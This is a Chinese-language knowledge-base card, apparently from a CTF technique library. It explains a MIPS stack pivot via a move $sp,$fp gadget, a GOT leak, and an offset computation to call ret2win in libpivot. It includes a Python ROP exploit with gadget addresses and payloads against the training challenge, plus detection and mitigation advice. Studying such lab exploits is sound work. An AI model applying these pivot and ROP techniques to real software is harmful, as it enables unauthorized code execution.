---
id: binary-pwn-rop-mips-pivot-got-libpivot-ret2win
title: MIPS 栈迁移 + GOT 泄露：pivot 到可控堆缓冲区并计算 libpivot 中 ret2win 偏移
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips-pivot-got-leak-libpivot-ret2win
aliases:
- MIPS pivot
- MIPS 栈迁移
- move sp fp gadget
- GOT 泄露
- libpivot 偏移
- ret2win 计算
tags:
- mips
- mipsel
- rop
- stack-pivot
- got-leak
- ret2libc
- gadget
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:40:14+08:00'
  notes: 已对照原文2098-2310行核对：pivot gadget 0x400CD0(move sp,fp;lw ra,8(sp);lw fp,4(sp);jr ra;addiu sp,0xC)、GOT读gadget 0x400CB0、add gadget 0x400CC4、foothold偏移0x9C0/ret2win 0xD38、两次read布局(cyclic(0x20)+fp+ra)及链顺序均与原文一致；dedup候选为ret2csu/其他pivot卡
---

## 一句话结论

当 MIPS 程序把一大块可控缓冲区（如 `malloc(0x1000000)` 后 `ptr+0xFFFF00`）的地址打印出来、而栈溢出只能覆盖保存的 `$fp`/`$ra` 时，可用 `move $sp,$fp; lw $ra,8($sp); lw $fp,4($sp); jr $ra` 把栈迁移到该缓冲区；在迁移后的链里先调用 `foothold_function` 强制解析 GOT，再用 `lw $t1,0($t2)` 读取 GOT 中的实际地址，减去 `foothold_function` 在 libpivot 中的已知偏移、加上 `ret2win` 偏移，最后用 `add $t9,$t0,$t1; jalr $t9` 调到 ret2win。

## 原理

- **程序结构**：`main` 中 `ptr = malloc(0x1000000)`，把 `ptr+0xFFFF00` 作为参数传给 `pwnme`；`pwnme` 第一次 `read(0, buf, 0x100)` 把数据读进这块可控内存（未来的迁移栈），第二次 `read(0, s, 0x28)` 读进 32 字节栈缓冲区，只能覆盖到 `$fp`/`$ra`，不足以放下完整 ROP 链。
- **栈迁移 gadget**：`move $sp,$fp; lw $ra,8($sp); lw $fp,4($sp); jr $ra; addiu $sp,0xC`。覆盖保存的 `$fp` 为第一次读入的缓冲区地址（程序会打印该地址），覆盖 `$ra` 为迁移 gadget；函数尾声恢复 `$fp`/`$ra` 后执行 `jr $ra` 进入 gadget，`move $sp,$fp` 把栈切到可控缓冲区，再从缓冲区偏移 8/4 取出下一跳和新的 `$fp`，开始执行堆上的长链。
- **GOT 泄露与库偏移**：`foothold_function` 在 `.MIPS.stubs` 中通过 GOT 调用；第一次调用前 GOT 可能未解析，调用后 GOT 写入 libpivot 中的实际地址。用 gadget `lw $t9,8($sp); lw $t2,4($sp); lw $t1,0($t2); jalr $t9` 读取 `foothold_function` 的 GOT 项；已知 `foothold_function` 在 libpivot 中的偏移（原文 0x9C0）和 `ret2win` 偏移（原文 0xD38），则 `ret2win 地址 = GOT 值 - 0x9C0 + 0xD38 = GOT 值 + (ret2win - foothold_function_offset)`。
- **计算与调用**：用 gadget `lw $t9,8($sp); lw $t0,4($sp); jalr $t9` 设置 `$t0 = delta`；再用读取 gadget 把 GOT 值放进 `$t1`；然后用 `add $t9,$t0,$t1; jalr $t9` 计算并调用 `ret2win`。
- **延迟槽与栈调整**：每个 gadget 末尾的 `addiu $sp,0xC`/`addiu $sp,4` 是链推进的关键，排布时要按反汇编计算每个参数占用的位置。

## 触发条件

- MIPS 程序有栈溢出，但栈上空间不足以放完整链，同时程序把可控缓冲区地址泄露给用户（打印/返回）。
- 存在 `move $sp,$fp` 或等价栈迁移 gadget；保存的 `$fp` 可被溢出覆盖。
- 程序/库中存在可利用的 GOT 项与已知库内偏移（libpivot 或 libc），能通过一次调用解析 GOT。
- 端序、地址固定（无 PIE 或已泄露基址），可正确打包。

## 利用步骤

1. 运行程序，读取它打印的 pivot 缓冲区地址（原文 `The Old Gods kindly bestow upon you a place to pivot: %p`）。
2. 第一次输入：在 pivot 缓冲区布置长 ROP 链（迁移后的“新栈”）。
3. 第二次输入：`cyclic(0x20) + p32(pivot_addr) + p32(pivot_gadget)`，覆盖保存的 `$fp` 与 `$ra`；函数返回后迁移 gadget 把 `$sp` 切到 pivot 缓冲区。
4. 在新栈上先调用 `foothold_function`（或任意库函数）触发 GOT 解析。
5. 用读 GOT gadget 取 `foothold_function@got` 的实际地址；按 `ret2win - foothold_function_offset` 计算 delta，用 add gadget 得到 `ret2win` 地址并调用。
6. `ret2win` 打开 `flag.txt` 并输出 flag（原文 `ROPE{a_placeholder_32byte_flag!}`）。

## PoC

```python
buf = 0x412000 + 0x28          # 程序打印的 pivot 地址附近（按实际 leak 调整）
ret2win = 0x0000D38
foothold_function_offset = 0x00009C0
foothold_function = 0x0400E60
foothold_function_got = 0x412060
gadget_set_t0 = 0x0400CA0      # lw t9,8(sp); lw t0,4(sp); jalr t9
gadget_read_got = 0x0400CB0    # lw t9,8(sp); lw t2,4(sp); lw t1,0(t2); jalr t9
gadget_add_call = 0x0400CC4    # add t9,t0,t1; jalr t9
gadget_pivot = 0x0400CD0       # move sp,fp; lw ra,8(sp); lw fp,4(sp); jr ra; addiu sp,0xC

ru(b"place to pivot: ")
leak = int(r(10), 16)

rop = ROP(elf)
rop.raw(0xdddd); rop.raw(leak); rop.raw(gadget_set_t0)
rop.raw(0xdddd); rop.raw(0xddda); rop.raw(foothold_function)   # 先调用，解析 GOT
rop.raw(0xdddd); rop.raw(leak); rop.raw(gadget_set_t0)
rop.raw(0xdddd); rop.raw(ret2win - foothold_function_offset); rop.raw(gadget_read_got)
rop.raw(0xdddd); rop.raw(foothold_function_got); rop.raw(gadget_add_call)
payload = rop.chain()

sla(b"> ", payload)                  # 第一次：堆上的长链
payload = cyclic(0x20) + p32(leak) + p32(gadget_pivot)
sla(b"> ", payload)                  # 第二次：迁移
```

## 变体与关联

- **无地址泄露**：若程序不打印 pivot 地址，可通过堆风水/固定地址（无 ASLR 的 uClibc 堆）或先泄露堆指针；也可以把链放在 .bss（若有写 gadget）而非堆。
- **无 GOT 解析**：若目标函数已解析（如 `system@got`），可直接读 GOT 计算 libc 基址；若静态链接，改用 `ret2syscall`/SROP。
- **关联**：[[binary-pwn-rop-mips32-stack-frame-gadget-args]] 是 MIPS ROP 基础；[[binary-pwn-rop-mips-bss-string-write-badchars-xor]] 展示写字符串；[[binary-pwn-stack-mips-srop-sigreturn-bss-execve]] 展示另一种栈迁移（SROP 到 .bss）。

## 检测与防御

- **检测**：程序打印可控缓冲区地址；溢出处只覆盖到 `$fp`/`$ra`；ROP 链中存在 `move $sp,$fp`、GOT 读取与 `add` 调用 gadget；运行时 `$sp` 突然指向堆/非栈区。
- **防御**：启用 PIE/ASLR，避免打印可用缓冲区地址；栈保护（canary）阻止覆盖 `$ra`；RELRO 保护 GOT；减少 `malloc` 大块可执行/可写缓冲区与 `read` 组合。
- **响应**：监控异常 `$sp` 指向堆区、GOT 读取和 `ret2win`/`system` 调用；保留崩溃现场分析迁移链。
